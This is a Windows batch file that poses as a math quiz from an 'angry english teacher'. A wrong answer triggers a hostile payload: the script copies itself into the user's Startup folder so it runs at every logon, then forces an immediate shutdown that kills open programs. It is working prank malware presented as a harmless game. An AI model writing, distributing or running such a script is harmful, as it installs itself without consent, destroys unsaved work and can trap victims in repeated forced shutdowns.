@echo off
color 57
echo Hey, i am angry english teacher but now i like maths so, answer my question: what is 29384759786987236495872645 * 870987098709879087* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709v* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709*0* 87098709* 87098709* 87098709* 87098709* 87098709* 87098709? : 
set /p love=
if %love%==0 goto right
if %love% NEQ 0 goto wrong
:right
echo Correct! your windows computer is safe
echo you are smart!
pause 
exit
:wrong
echo you have angered me more...
echo I have Hacked you
echo Your Windows computer will crash in 10 seconds
timeout 10
rem Get the path to the current script
set "script_path=%~dp0"
set "script_name=%~nx0"

rem Set the destination path to the Startup folder
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Copy the script to the Startup folder
copy "%script_path%%script_name%" "%startup_folder%" > nul

rem Shutdown the computer
shutdown /s /f /t 0

